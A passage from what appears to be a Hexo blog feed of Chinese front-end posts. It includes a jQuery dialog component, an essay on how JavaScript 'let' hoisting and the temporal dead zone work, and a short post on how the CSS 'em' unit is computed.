class="tag">&lt;<span class="name">span</span>&gt;</span>X<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>`</span><br><span class="line">  this.<span class="variable">$temp</span> = $(temp)</span><br><span class="line">&#125;</span><br><span class="line">Dialog.prototype.hide = <span class="keyword">function</span> () &#123;</span><br><span class="line">  this.<span class="variable">$temp</span>.detach()</span><br><span class="line">&#125;</span><br><span class="line">Dialog.prototype.bindEvent = <span class="keyword">function</span> () &#123;</span><br><span class="line">  $(<span class="string">&#x27;body&#x27;</span>).on(<span class="string">&#x27;click&#x27;</span>, <span class="string">&#x27;.zc-dialog-wrap&gt;span, .zc-dialog-button&gt;.zc-dialog-confirm, .zc-dialog-button&gt;.zc-dialog-cancel&#x27;</span>, <span class="keyword">function</span>()&#123;</span><br><span class="line">    dialog.hide()</span><br><span class="line">    <span class="keyword">if</span> (this.classList[<span class="number">0</span>] === <span class="string">&#x27;zc-dialog-confirm&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span><span class="built_in"> true</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (this.classList[<span class="number">0</span>] === <span class="string">&#x27;zc-dialog-cancel&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span><span class="built_in"> false</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">Dialog.prototype.setSize = <span class="keyword">function</span> (<span class="keyword">option</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">option</span>.width &amp;&amp; <span class="keyword">option</span>.width &gt; <span class="number">330</span>)&#123;</span><br><span class="line">    this.<span class="variable">$temp</span>.find(<span class="string">&#x27;.zc-dialog-wrap&#x27;</span>).css(&#123;width: `$&#123;<span class="keyword">option</span>.width&#125;px`&#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">option</span>.height &amp;&amp; <span class="keyword">option</span>.height &gt; <span class="number">150</span>)&#123;</span><br><span class="line">    this.<span class="variable">$temp</span>.find(<span class="string">&#x27;.zc-dialog-body&#x27;</span>).css(&#123;height: `$&#123;<span class="keyword">option</span>.height&#125;px`&#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Dialog.prototype.alert = <span class="keyword">function</span> (<span class="keyword">option</span>) &#123;</span><br><span class="line">  this.template(<span class="keyword">option</span>)</span><br><span class="line">  this.<span class="variable">$temp</span>.find(<span class="string">&#x27;.zc-dialog-button&#x27;</span>).addClass(<span class="string">&#x27;zc-dialog-button-alert&#x27;</span>).removeClass(<span class="string">&#x27;zc-dialog-button-confirm&#x27;</span>).html(`<span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;zc-dialog-confirm&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span>&gt;</span>确认<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span>`)</span><br><span class="line">  this.setSize(<span class="keyword">option</span>)</span><br><span class="line">  $(<span class="string">&#x27;body&#x27;</span>).append(this.<span class="variable">$temp</span>)</span><br><span class="line">&#125;</span><br><span class="line">Dialog.prototype.confirm = <span class="keyword">function</span> (<span class="keyword">option</span>) &#123;</span><br><span class="line">  this.template(<span class="keyword">option</span>)</span><br><span class="line">  this.<span class="variable">$temp</span>.find(<span class="string">&#x27;.zc-dialog-button&#x27;</span>).addClass(<span class="string">&#x27;zc-dialog-button-confirm&#x27;</span>).removeClass(<span class="string">&#x27;zc-dialog-button-alert&#x27;</span>).html(`<span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;zc-dialog-confirm&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span>&gt;</span>确认<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;zc-dialog-cancel&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span>&gt;</span>取消<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span>`)</span><br><span class="line">  this.setSize(<span class="keyword">option</span>)</span><br><span class="line">  $(<span class="string">&#x27;body&#x27;</span>).append(this.<span class="variable">$temp</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var dialog = new Dialog();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$(<span class="string">&#x27;.a1&#x27;</span>).click(<span class="keyword">function</span>()&#123;</span><br><span class="line">  dialog.alert(&#123;</span><br><span class="line">    title: <span class="string">&#x27;非模态窗口&#x27;</span>,</span><br><span class="line">    content: <span class="string">&#x27;&lt;p&gt;这是一个非模态窗口,并且不带按钮&lt;/p&gt;&#x27;</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">$(<span class="string">&#x27;.a2&#x27;</span>).click(<span class="keyword">function</span>()&#123;</span><br><span class="line">  dialog.confirm(&#123;</span><br><span class="line">    title: <span class="string">&#x27;非模态窗口&#x27;</span>,</span><br><span class="line">    content: <span class="string">&#x27;&lt;p&gt;确定要删除吗？&lt;/p&gt;&#x27;</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>持续更新~~~</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>我用了两个月的时间才理解 let</title>
      <link href="/Blog/2018/09/03/essay/%E6%88%91%E7%94%A8%E4%BA%86%E4%B8%A4%E4%B8%AA%E6%9C%88%E7%9A%84%E6%97%B6%E9%97%B4%E6%89%8D%E7%90%86%E8%A7%A3let/index/"/>
      <url>/Blog/2018/09/03/essay/%E6%88%91%E7%94%A8%E4%BA%86%E4%B8%A4%E4%B8%AA%E6%9C%88%E7%9A%84%E6%97%B6%E9%97%B4%E6%89%8D%E7%90%86%E8%A7%A3let/index/</url>
      
        <content type="html"><![CDATA[<p>当然不是说用完整的两个月时间来理解 let，而是零零碎碎地理解，同时我还要想着怎么写出一篇文章把这个事情说清楚。</p><p>在 let 刚出来的时候，我就「以为」我理解了 let。<strong>然鹅在过去的两个月里，我对 let 的理解发生了一波三折的变化。</strong></p><p><strong>我写这篇文章，是希望我的学习过程，能对你自学有帮助。</strong></p><h2 id="初识-let"><a href="#初识-let" class="headerlink" title="初识 let"></a>初识 let</h2><p>跟很多人一样，我第一次了解 let 的特性是从 MDN 的文档：</p><p><img src="/Blog/2018/09/03/essay/%E6%88%91%E7%94%A8%E4%BA%86%E4%B8%A4%E4%B8%AA%E6%9C%88%E7%9A%84%E6%97%B6%E9%97%B4%E6%89%8D%E7%90%86%E8%A7%A3let/index/img.png"></p><p>我得到的信息有这么几条：</p><ul><li>let 声明的变量的作用域是块级的；</li><li>let 不能重复声明已存在的变量；</li><li>let 有暂时死区，不会被提升。</li></ul><p>大部分人应该都是这么认为的，我也是这么理解的。</p><p>这个理解「没有问题」，但是不够「全面和深刻」。</p><h2 id="第一次质疑"><a href="#第一次质疑" class="headerlink" title="第一次质疑"></a>第一次质疑</h2><p>我第一次质疑我的理解是在遇到 for 循环的时候，代码如下。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 代码段1</span></span><br><span class="line"><span class="selector-tag">var</span> liList = document<span class="selector-class">.querySelectorAll</span>(<span class="string">&#x27;li&#x27;</span>) <span class="comment">// 共5个li</span></span><br><span class="line"><span class="function"><span class="title">for</span><span class="params">( var i=<span class="number">0</span>; i&lt;liList.length; i++)</span></span>&#123;</span><br><span class="line">  liList<span class="selector-attr">[i]</span><span class="selector-class">.onclick</span> = <span class="built_in">function</span>()&#123;</span><br><span class="line">    console<span class="selector-class">.log</span>(i)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大家都知道依次点击 li <a href="https://link.zhihu.com/?target=http://js.jirengu.com/vesat/3/edit?html,js,console,output">会打印出 5 个 5</a>。如果把 var i 改成 let i，就会分别<a href="https://link.zhihu.com/?target=http://js.jirengu.com/vesat/4/edit?html,js,console,output">打印出 0、1、2、3、4</a>：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 代码段2</span></span><br><span class="line"><span class="selector-tag">var</span> liList = document<span class="selector-class">.querySelectorAll</span>(<span class="string">&#x27;li&#x27;</span>) <span class="comment">// 共5个li</span></span><br><span class="line"><span class="function"><span class="title">for</span><span class="params">( let i=<span class="number">0</span>; i&lt;liList.length; i++)</span></span>&#123;</span><br><span class="line">  liList<span class="selector-attr">[i]</span><span class="selector-class">.onclick</span> = <span class="built_in">function</span>()&#123;</span><br><span class="line">    console<span class="selector-class">.log</span>(i)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>然而，用我之前的知识来理解这个代码是不能自圆其说的</strong>。因为代码中依然只声明了一个 i，在 for 循环结束后，i 的值还是会变成 5 才对。</p><p><strong>这说明我的理解有误。</strong></p><p>于是我去看 MDN 的例子，发现鸡贼的 MDN 巧妙地避开了这个问题，它的例子是这样的：</p><p><img src="/Blog/2018/09/03/essay/%E6%88%91%E7%94%A8%E4%BA%86%E4%B8%A4%E4%B8%AA%E6%9C%88%E7%9A%84%E6%97%B6%E9%97%B4%E6%89%8D%E7%90%86%E8%A7%A3let/index/img_1.png"></p><p>你看 MDN 的例子，在每次循环的时候用 let j 保留的 i 的值，所以在 i 变化的时候，j 并不会变化。而console.log 的是 j，所以不会出现 5 个 5。</p><p><strong>为什么 MDN 要故意声明一个 j 呢，为什么不直接用 i 呢？</strong></p><p><strong>我猜测 MDN 为了简化知识，隐瞒了什么。</strong></p><p>于是我去看了看 ES 文档，其中的 <a href="https://link.zhihu.com/?target=http://www.ecma-international.org/ecma-262/6.0/%23sec-for-statement-runtime-semantics-labelledevaluation">13.7.4.7 章节</a> 清楚地说明了个中缘由，但是由于说得太清楚了，很多人都看不下去，不信你可以试试。</p><p>我说一下我的理解：</p><ol><li><strong>for( let i &#x3D; 0; i&lt; 5; i++) 这句话的圆括号之间，有一个隐藏的作用域</strong></li><li><strong>for( let i &#x3D; 0; i&lt; 5; i++) { 循环体 } 在每次执行循环体之前，JS 引擎会把 i 在循环体的上下文中重新声明及初始化一次。</strong></li><li>其他细节就不说了，太细碎了</li></ol><p>也就是说上面的代码段2可以<strong>近似近似近似地</strong>理解为</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 代码段3</span></span><br><span class="line"><span class="selector-tag">var</span> liList = document<span class="selector-class">.querySelectorAll</span>(<span class="string">&#x27;li&#x27;</span>) <span class="comment">// 共5个li</span></span><br><span class="line"><span class="function"><span class="title">for</span><span class="params">( let i=<span class="number">0</span>; i&lt;liList.length; i++)</span></span>&#123;</span><br><span class="line">  let <span class="selector-tag">i</span> = 隐藏作用域中的<span class="selector-tag">i</span> <span class="comment">// 看这里看这里看这里</span></span><br><span class="line">  liList<span class="selector-attr">[i]</span><span class="selector-class">.onclick</span> = <span class="built_in">function</span>()&#123;</span><br><span class="line">    console<span class="selector-class">.log</span>(i)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那样的话，5 次循环，就会有 5 个不同的 i，console.log 出来的 i 当然也是不同的值。</p><p>再加上隐藏作用域里的 i，一共有 6 个 i。</p><p>这就是 MDN 加那句 let j &#x3D; i 的原因：方便新人理解。</p><p>总得来说就是 let&#x2F;const 在与 for 一起用时，会有一个 perIterationBindings 的概念（一种语法糖）。</p><p>从此之后，我就开始怀疑我对 let 的所有理解了。</p><h2 id="第二次质疑"><a href="#第二次质疑" class="headerlink" title="第二次质疑"></a>第二次质疑</h2><p>我在 StackOverflow 上闲逛的时候，无意中发现了一个是关于「let 到底有没有提升」的问题：</p><p><a href="https://link.zhihu.com/?target=https://stackoverflow.com/questions/31219420/are-variables-declared-with-let-or-const-not-hoisted-in-es6">Are variables declared with let or const not hoisted in ES6?</a></p><p>其中一个高票回答认为 <a href="https://link.zhihu.com/?target=https://stackoverflow.com/a/31222689/1262580">JS 中所有的声明（var&#x2F;let&#x2F;const&#x2F;function&#x2F;class），都存在提升</a>，理由是如下代码：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&quot;global&quot;</span>;</span><br><span class="line"><span class="regexp">//</span> <span class="keyword">function</span> scope:</span><br><span class="line">(<span class="keyword">function</span>() &#123;</span><br><span class="line">    x; <span class="regexp">//</span> not <span class="string">&quot;global&quot;</span></span><br><span class="line"></span><br><span class="line">    var<span class="regexp">/let/</span>… x;</span><br><span class="line">&#125;());</span><br><span class="line"><span class="regexp">//</span> block scope (not <span class="keyword">for</span> `var`s):</span><br><span class="line">&#123;</span><br><span class="line">    x; <span class="regexp">//</span> not <span class="string">&quot;global&quot;</span></span><br><span class="line"></span><br><span class="line">    let<span class="regexp">/const/</span>… x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我觉得他说得挺有道理的。于是我又去 MDN 和 ECMAScript 翻了翻，发现两处疑点：</p><ol><li>MDN 关于 let 是否存在提升的章节，被编辑了两次，第一次说存在提升，第二次说不存在提升（参考 <a href="https://link.zhihu.com/?target=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/let%2524compare?locale=en-US&to=1242757&from=1242229">2017 年 3 月 10 号的变更记录</a>）。也就是说 MDN 的维护者都在这个问题上产生过分歧，更何况我们了。</li><li>ES 文档里出现了「var&#x2F;let hoisting」字样。</li></ol><p>鉴于此，我认为应该尊重 ES 文档，认为 let 确实存在提升。只不过由于暂时死区的限制，你不能在 let x 之前使用 let（详见 <a href="https://zhuanlan.zhihu.com/p/27558914">let 声明会提升（hoist）吗？</a>）。</p><h2 id="故事并没有结束"><a href="#故事并没有结束" class="headerlink" title="故事并没有结束"></a>故事并没有结束</h2><p>当一个疑问一直存在你脑中时，你会在潜意识中不停地对它进行消化和思考。</p><p>上面说到我认为 let 存在提升的主要原因是 ES 文档中出现了「var&#x2F;let hoisting」字样。</p><p>但是我在咨询 TC39 的成员 <strong><u style="text-decoration: none; border-bottom: 1px dashed gray;"><a href="https://link.zhihu.com/?target=https://twitter.com/rwaldron">Rick Waldron</a></u></strong> 时，他是这么说的：</p><blockquote><p>You’re misunderstanding the intention of that (non-normative) Note. let and const do not hoist as var and function decls do.</p></blockquote><p>而且还细心地专门写了一个 <a href="https://link.zhihu.com/?target=https://gist.github.com/rwaldron/ca35924d59ddc60a6aa165e1e4a3acda">gist</a> 来详细解释（twitter 有 140 字限制）。</p><p>既然 TC39 的 representative 都说了 let hoisting 不是一个正式词汇，那我就应该重新思考一下什么是「提升」了。</p><p>于是就有了这篇文章，我想要说一下我对「提升」的理解。你看完之后，就知道 let 到底有没有「提升」。</p><p>首先明确一点：提升不是一个技术名词。</p><p>要搞清楚提升的本质，需要理解 JS 变量的「创建create、初始化initialize 和赋值assign」</p><p>有的地方把创建说成是声明（declare），为了将这个概念与变量声明区别开，我故意不使用声明这个字眼。</p><p>有的地方把初始化叫做绑定（binding），但我感觉这个词不如初始化形象。</p><p><strong>我们来看看 var 声明的「创建、初始化和赋值」过程</strong></p><p>假设有如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="number">1</span></span><br><span class="line">  <span class="keyword">var</span> y = <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">fn</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure><p>在执行 fn 时，会有以下过程（不完全）：</p><ol><li>进入 fn，为 fn 创建一个环境。</li><li>找到 fn 中所有用 var 声明的变量，在这个环境中「创建」这些变量（即 x 和 y）。</li><li>将这些变量「初始化」为 undefined。</li><li>开始执行代码</li><li>x &#x3D; 1 将 x 变量「赋值」为 1</li><li>y &#x3D; 2 将 y 变量「赋值」为 2</li></ol><p>也就是说 var 声明会在代码执行之前就将「创建变量，并将其初始化为 undefined」。</p><p>这就解释了为什么在 var x &#x3D; 1 之前 console.log(x) 会得到 undefined。</p><p><strong>接下来来看 function 声明的「创建、初始化和赋值」过程</strong></p><p>假设代码如下：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fn2</span>()</span><br><span class="line"></span><br><span class="line">function <span class="built_in">fn2</span>()&#123;</span><br><span class="line">  console<span class="selector-class">.log</span>(<span class="number">2</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>JS 引擎会有一下过程：</p><ol><li>找到所有用 function 声明的变量，在环境中「创建」这些变量。</li><li>将这些变量「初始化」并「赋值」为 function(){ console.log(2) }。</li><li>开始执行代码 fn2()</li></ol><p>也就是说 function 声明会在代码执行之前就「创建、初始化并赋值」。</p><p><strong>接下来看 let 声明的「创建、初始化和赋值」过程</strong></p><p>假设代码如下：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  let x <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">  x <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们只看 {} 里面的过程：</p><ol><li>找到所有用 let 声明的变量，在环境中「创建」这些变量</li><li>开始执行代码（注意现在还没有初始化）</li><li>执行 x &#x3D; 1，将 x 「初始化」为 1（这并不是一次赋值，如果代码是 let x，就将 x 初始化为 undefined）</li><li>执行 x &#x3D; 2，对 x 进行「赋值」</li></ol><p>这就解释了为什么在 let x 之前使用 x 会报错：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="string">&#x27;global&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(x) <span class="comment">// Uncaught ReferenceError: x is not defined</span></span><br><span class="line">  <span class="keyword">let</span> x = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>原因有两个</p><ol><li>console.log(x) 中的 x 指的是下面的 x，而不是全局的 x</li><li>执行 log 时 x 还没「初始化」，所以不能使用（也就是所谓的暂时死区）</li></ol><p>看到这里，你应该明白了 let 到底有没有提升：</p><ol><li>let 的「创建」过程被提升了，但是初始化没有提升。</li><li>var 的「创建」和「初始化」都被提升了。</li><li>function 的「创建」「初始化」和「赋值」都被提升了。</li></ol><p>最后看 const，其实 const 和 let 只有一个区别，那就是 const 只有「创建」和「初始化」，没有「赋值」过程。</p><p>这四种声明，用下图就可以快速理解：</p><p><img src="/Blog/2018/09/03/essay/%E6%88%91%E7%94%A8%E4%BA%86%E4%B8%A4%E4%B8%AA%E6%9C%88%E7%9A%84%E6%97%B6%E9%97%B4%E6%89%8D%E7%90%86%E8%A7%A3let/index/img_2.png"></p><h2 id="完了吗？"><a href="#完了吗？" class="headerlink" title="完了吗？"></a>完了吗？</h2><p>故事依然没有结束，来看知乎上问了一个问题：<a href="https://www.zhihu.com/question/62966713">如何理解 let x &#x3D; x 报错之后，再次 let x 依然会报错？</a></p><p><img src="/Blog/2018/09/03/essay/%E6%88%91%E7%94%A8%E4%BA%86%E4%B8%A4%E4%B8%AA%E6%9C%88%E7%9A%84%E6%97%B6%E9%97%B4%E6%89%8D%E7%90%86%E8%A7%A3let/index/img_3.png"></p><p>这个问题说明：如果 let x 的初始化过程失败了，那么</p><ol><li>x 变量就将永远处于 created 状态。</li><li>你无法再次对 x 进行初始化（初始化只有一次机会，而那次机会你失败了）。</li><li>由于 x 无法被初始化，所以 x 永远处在暂时死区（也就是盗梦空间里的 limbo）！</li><li>有人会觉得 JS 坑，怎么能出现这种情况；其实问题不大，因为此时代码已经报错了，后面的代码想执行也没机会。</li></ol><p>以上，就是一个 let 引发的思考。</p><p>重要参考：<a href="https://link.zhihu.com/?target=https://rainsoft.io/variables-lifecycle-and-why-let-is-not-hoisted/">JavaScript variables lifecycle: why let is not hoisted</a></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HTML关于em趣闻</title>
      <link href="/Blog/2018/08/31/zch&#39;s_fool/HTML%E5%85%B3%E4%BA%8Eem%E8%B6%A3%E9%97%BB/index/"/>
      <url>/Blog/2018/08/31/zch&#39;s_fool/HTML%E5%85%B3%E4%BA%8Eem%E8%B6%A3%E9%97%BB/index/</url>
      
        <content type="html"><![CDATA[<h3 id="em的计算标准并不是父元素的字体大小？"><a href="#em的计算标准并不是父元素的字体大小？" class="headerlink" title="em的计算标准并不是父元素的字体大小？"></a>em的计算标准并不是父元素的字体大小？</h3><h6 id="首先我们先来看百度的搜索结果（错误言论！）…"><a href="#首先我们先来看百度的搜索结果（错误言论！）…" class="headerlink" title="首先我们先来看百度的搜索结果（错误言论！）…"></a>首先我们先来看百度的搜索结果（错误言论！）…</h6><p><img src="/Blog/2018/08/31/zch's_fool/HTML%E5%85%B3%E4%BA%8Eem%E8%B6%A3%E9%97%BB/index/img.png" alt="百度上的错误言论！！！"></p><h6 id="网上以讹传讹这么多年了，一时难以消除，你一不小心记住了错误的知识就不好办了（在此之前本人也是一直误以为em是根据父元素的font-size计算出来的-x3D-。-x3D-）。"><a href="#网上以讹传讹这么多年了，一时难以消除，你一不小心记住了错误的知识就不好办了（在此之前本人也是一直误以为em是根据父元素的font-size计算出来的-x3D-。-x3D-）。" class="headerlink" title="网上以讹传讹这么多年了，一时难以消除，你一不小心记住了错误的知识就不好办了（在此之前本人也是一直误以为em是根据父元素的font-size计算出来的&#x3D;。&#x3D;）。"></a>网上以讹传讹这么多年了，一时难以消除，你一不小心记住了错误的知识就不好办了（在此之前本人也是一直误以为em是根据父元素的<code>font-size</code>计算出来的&#x3D;。&#x3D;）。</h6><p><img src="/Blog/2018/08/31/zch's_fool/HTML%E5%85%B3%E4%BA%8Eem%E8%B6%A3%E9%97%BB/index/img_1.png"></p><h5 id="上面的例子很明显地说明-em-只跟当前元素的-font-size-有关。"><a href="#上面的例子很明显地说明-em-只跟当前元素的-font-size-有关。" class="headerlink" title="上面的例子很明显地说明 em 只跟当前元素的 font-size 有关。"></a>上面的例子很明显地说明 em 只跟当前元素的 font-size 有关。</h5><h6 id="那么为什么网上的傻-说-em-是基于父元素的-font-size-呢？因为如下代码："><a href="#那么为什么网上的傻-说-em-是基于父元素的-font-size-呢？因为如下代码：" class="headerlink" title="那么为什么网上的傻*说 em 是基于父元素的 font-size 呢？因为如下代码："></a>那么为什么网上的傻*说 em 是基于父元素的 font-size 呢？因为如下代码：</h6><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.parent</span>&#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">12px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.child</span>&#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">2em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为这些傻*直接把 em 写到 font-size 上了，所以他就没有机会改子元素的 font-size，那么子元素的默认 font-size 就是父元素的 font-size。</p><p>所以这些傻*就说 em 是基于父元素的 font-size。</p><p>你只要改成</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.child</span>&#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">2em</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="而且推荐的网站-MDN-也说得十分清楚：基于父元素只是-em-用在-font-size-上时的特例啊，看下图。"><a href="#而且推荐的网站-MDN-也说得十分清楚：基于父元素只是-em-用在-font-size-上时的特例啊，看下图。" class="headerlink" title="而且推荐的网站 MDN 也说得十分清楚：基于父元素只是 em 用在 font-size 上时的特例啊，看下图。"></a>而且推荐的网站 MDN 也说得十分清楚：基于父元素只是 em 用在 font-size 上时的特例啊，看下图。</h5><p><img src="/Blog/2018/08/31/zch's_fool/HTML%E5%85%B3%E4%BA%8Eem%E8%B6%A3%E9%97%BB/index/img_2.png"></p><h4 id="最后的话：学前端还是多看看权威的官网文档吧（推荐MDN），以免再次被这种错误坑害数十年。。。"><a href="#最后的话：学前端还是多看看权威的官网文档吧（推荐MDN），以免再次被这种错误坑害数十年。。。" class="headerlink" title="最后的话：学前端还是多看看权威的官网文档吧（推荐MDN），以免再次被这种错误坑害数十年。。。"></a>最后的话：学前端还是多看看权威的官网文档吧（推荐MDN），以免再次被这种错误坑害数十年。。。</h4>]]></content>
      
      
      <categories>
          
          <category> 趣闻 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSS细节的威力</title>
      <link href="/Blog/2018/08/31/essay/CSS%E7%BB%86%E8%8A%82%E7%9A%84%E5%A8%81%E5%8A%9B/index/"/>
      <url>/Blog/2018/08/31/essay/CSS%E7%BB%86%E8%8A%82%E7%9A%84%E5%A8%81%E5%8A%9B/index/</url>
      
        <content type="html"><![CDATA[<p><img src="/Blog/2018/08/31/essay/CSS%E7%BB%86%E8%8A%82%E7%9A%84%E5%A8%81%E5%8A%9B/index/img.webp"></p><h4 id="css神奇的属性scroll-behavior！"><a href="#css神奇的属性scroll-behavior！" class="headerlink" title="css神奇的属性scroll-behavior！"></a>css神奇的属性scroll-behavior！</h4>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Git好项目</title>
      <link href="/Blog/2018/08/24/essay/Git%E5%A5%BD%E9%A1%B9%E7%9B%AE/index/"/>
      <url>/Blog/2018/08/24/essay/Git%E5%A5%BD%E9%A1%B9%E7%9B%AE/index/</url>
      
        <content type="html"><![CDATA[<p><a href="https://yuchengkai.cn/docs/zh/frontend/">面试图谱</a></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>前端最全的 API 集锦</title>
      <link href="/Blog/2018/08/23/day_thinking/%E5%89%8D%E7%AB%AF%E6%9C%80%E5%85%A8%E7%9A%84API%E9%9B%86%E9%94%A6/index/"/>
      <url>/Blog/2018/08/23/day_thinking/%E5%89%8D%E7%AB%AF%E6%9C%80%E5%85%A8%E7%9A%84API%E9%9B%86%E9%94%A6/index/</url>
      
